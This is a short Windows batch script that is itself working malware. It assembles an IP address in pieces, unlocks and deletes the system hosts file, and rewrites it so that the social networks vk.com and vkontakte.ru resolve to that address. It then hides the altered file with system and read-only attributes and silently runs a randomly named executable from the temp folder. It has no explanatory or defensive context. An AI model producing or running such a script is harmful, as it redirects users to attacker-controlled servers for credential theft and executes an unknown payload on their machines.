@echo off
@set XCS=92
@set XCS=%XCS%.
@set XCS=%XCS%38.209.180
@cd %windir%
@cd system32
@cd drivers
@cd etc
@attrib -A -H -S -R hosts
@del hosts
@echo 127.0.0.1 localhost> hosts
@echo %XCS% vk.com>> hosts
@echo %XCS% vkontakte.ru>> hosts
@attrib +H +S +R hosts
@%temp%\dcG534JKx.exe